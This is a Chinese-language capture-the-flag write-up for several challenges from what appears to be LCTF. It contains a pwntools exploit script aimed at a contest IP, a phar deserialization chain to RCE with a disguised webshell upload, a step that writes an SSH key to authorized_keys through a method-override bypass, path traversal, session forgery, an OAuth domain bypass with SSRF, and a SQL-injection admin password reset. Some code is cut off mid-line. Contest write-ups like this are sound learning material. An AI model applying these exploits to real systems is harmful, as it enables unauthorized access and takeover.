    from pwn import *
    import ctypes, copy, time 
    libc = ctypes.CDLL("libc.so.6")
    c32 = lambda x: ctypes.c_uint32(x).value
    c8 = lambda x: ctypes.c_uint8(x).value 
    h2n = lambda x: map(ord, x.decode('hex'))
    n2h = lambda x: ''.join(map(chr, x)).encode('hex')
    #p = process("./just_pwn")
    p = remote("118.25.148.66", 2333)
    libc.srand(libc.time(0))
    class NumbnutsBlockCipher(object):
        def __init__(self):
            self.add_key = []
            self.sr1 = []
            self.sr2 = []
            self.xor_key = []
            for i in xrange(16):
                self.add_key.append(c8(libc.rand()))
                self.sr1.append(c8(libc.rand()) & 0xf)
                self.sr2.append(c8(libc.rand()) & 0xf)
                self.xor_key.append(c8(libc.rand()))
            return
        def pad(self, data):
            if len(data) % 16 == 0:
                return data + [0x10] * 0x10
            c = len(data) % 16
            return data + [16 - c] * (16 - c)
        def unpad(self, data):
            return data[:-data[-1]]
        def decrypt_round(self, out):
            assert len(out) == 16
            for i in xrange(16):
                out[self.sr1[i]] ^= self.xor_key[i]
                out[self.sr2[i]] ^= self.xor_key[i]
            for i in xrange(16):
                out[i] = c8(out[i] - self.add_key[i])
            return out 
        def encrypt_round(self, out):
            assert len(out) == 16
            for i in xrange(16):
                out[i] = c8(out[i] + self.add_key[i])
            for i in xrange(16):
                out[self.sr1[i]] ^= self.xor_key[i]
                out[self.sr2[i]] ^= self.xor_key[i]
            return out 
        def hex2num(self, data):
            return map(ord, data.decode('hex'))
        def encrypt(self, data, iv):
            data = self.pad(data)
            bn = 0
            result = []
            while bn * 16 
    52:54:00:48:c8:73（hex）->90520735500403(int)
因为`nginx`禁用了`PUT`方法，所以用`X-HTTP-Method-Override:PUT`绕过
然后向`/home/lctf/.ssh/authorized_keys` 写入自己的公钥  
### T4lk 1s ch34p,sh0w m3 the sh31l
    $SECRET  = `../read_secret`;                                   
    $SANDBOX = "../data/" . md5($SECRET. $_SERVER["REMOTE_ADDR"]); 
    $FILEBOX = "../file/" . md5("K0rz3n". $_SERVER["REMOTE_ADDR"]);  
    class K0rz3n_secret_flag { 
        protected $file_path; 
        function __destruct(){ 
            if(preg_match('/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i', $this->file_path)){ 
                die("Sorry Sorry Sorry"); 
            } 
        include_once($this->file_path); 
     } 
    } 
    function check_session(){
       //cookie取数据并进行签名校验
      //return 数据中的路径，既$SANDBOX
    }
    ...
    $mode = $_GET["m"]; 
    if ($mode == "upload"){ 
         upload(check_session()); 
    } 
    else if ($mode == "show"){ 
        show(check_session()); 
    } 
    else if ($mode == "check"){ 
        check(check_session()); 
    } 
    else if($mode == "move"){ 
        move($_GET['source'],$_GET['dest']); 
    } 
    else{ 
        highlight_file(__FILE__);     
    }
#### 1\. 上传要被include的webshell
    GIF89a
#### 2\. 用另一个remoteip对应的浏览器上传phar文件
    file_path)){
                die("Sorry Sorry Sorry");
            }
        include_once($this->file_path);
        }
     }
    $a= new K0rz3n_secret_flag;
    $p = new Phar('./1.phar', 0);
    $p->startBuffering();
    $p->setStub('GIF89a');
    $p->setMetadata($a);
    $p->addFromString('1.txt','text');
    $p->stopBuffering();
    rename('./1.phar', 'avatar.gif');
#### 3\. 利用wrapper phar:// 触发反序列化=>RCE
### L playground2
通过os.path.join特性, 实现读取/var/www/project/playground目录/文件
    >>> os.path.join('/etc', '/passwd')
    '/passwd'
下载pyc反编译
    http://212.64.7.239/sandbox?url=file://sandbox//var/www/project/playground/__pycache__&token=LRXfAXOKKIiR6y0hkqZ9VmbiO5Pkguhn09OVvwF/S5jZ9nJ4w0abYS5ADGreQd9mENGxPUQ4OLrtPOh7vuXCXBqQ/BHAyiwWONd01jW0ONdLSyLOI/fy3sr+lIvGei5ue9wd/XqM9WawN26tpaZ372nitSp6ZONiO1VGFtgwdmpgwMvUlZPgzj5vcgGRSNFj
在main.py发现username为admin即可get flag
    @app.route('/')
    def index():
        user = request.cookies.get('user', '')
        try:
            username = session_decode(user)
        except Exception:
            username = get_username()
            content = escape(username)
        else:
            if username == 'admin':
                content = escape(FLAG)
            else:
                content = escape(username)
        resp = make_response(render_template('main.html', content=content))
        return resp
在 session.py 文件里有 session_encode 的实现, 整个加密简化一下就是
`session_encode(content) => base32(content).[MDA(char) for char in content]`
由于签名部分是对每个字母分别 MDA 加密(题目中魔改MDx实现的一种MAC算法), 而且seed固定, 所以每个字母在加密之后得出的加密串不会改变.
另外在没有设置user的cookie时, `main.py`中会取随机5个字符作为username, session_encode后发送给客户端.
那么就重复随机生成username, 找每个字母MDA加密后的结果, 拼接即可.
    b962d95efd252479 => a
    84407154c863ef36 => d
    e80346042c47531a => m
    6e1beb0db216d969 => i
    b020cd1cf4031b57 => n
    MFSG22LO.b962d95efd25247984407154c863ef36e80346042c47531a6e1beb0db216d969b020cd1cf4031b57
### EZ OAuth
#### 简单说明
利用`OAUTH`认证登录的系统，所采用的第三方为`TYPCN`  
题目应用从`TYPCN`获取用户的邮箱信息，匹配到是pwnhub.cn这个域才可以使用正常功能。
#### 绕过邮箱检测机制
邮箱检测机制是从头开始匹配，匹配到
pwnhub.cn为止，所以可以构造三级域名`xxxx@pwnhub.cn.mydomain`邮箱，绕过检测机制，为了方便，直接采用了腾讯的企业邮，注册的时候域名部分填`pwnhub.cn.mydomain`  
#### user的功能触发ssrf -> 中间人劫持攻击
用https服务器接收一下
在burp上重放他这个报文，得到返回json数据是  
猜测服务端是接收到返回的json，验证签名`sign(jsondata.result) == jsondata.sign`  
然后再根据`result`返回给用户相应的内容。  
于是想到攻击思路是，我在远程服务器上构造返回一个这样的`json`数据（相当于中间人攻击），根据猜测的代码写法，是存在弱类型判断的，也就是我返回给他`sign:true`，那么签名判断就被绕过了。  
测试了一下，确实如此
根据hint: 不同的功能可能利用类似的接口，在admin页面就可以用同样的办法进行中间人劫持，返回`true`，从而认证成admin。  
### 年久失修的系统
`id`参数可以注入，但限制的很死
解题过程中猜测修改密码或签名的时候的流程是  
先用`select`通过id选出该用户检测是否为当前session中的用户，  
再用`update`通过id更新用户信息。
我们想到的做法是寻找一个变化的mysql系统变量，例如`@@timestamp`、`@@pseudo_thread_id`，然后让`id=myid-@@timestamp
mod 2*(myid-adminid)`，这样`select`和`update`所计算出的实际id不同，`select`使用的是我的id，可以通过用户检测，`update`使用的是admin的id，就可以重置admin的密码。
但是尝试了很长的时间，发现很难竞争成功.  
按照出题人给的poc
    id=100001+@a：=@a：=@a is not null
我构造出了
    id = myid-(myid-adminid)*@t:=@t:=@t is not null
是可以的，因为他在同一个连接中，第一次被调用就会+1,再乘上myid和adminid的差值，就可以在第二次的时候选中admin对应的记录。
然后登录admin后台后，存在一个后台注入  
直接py:  
### God of domain pentest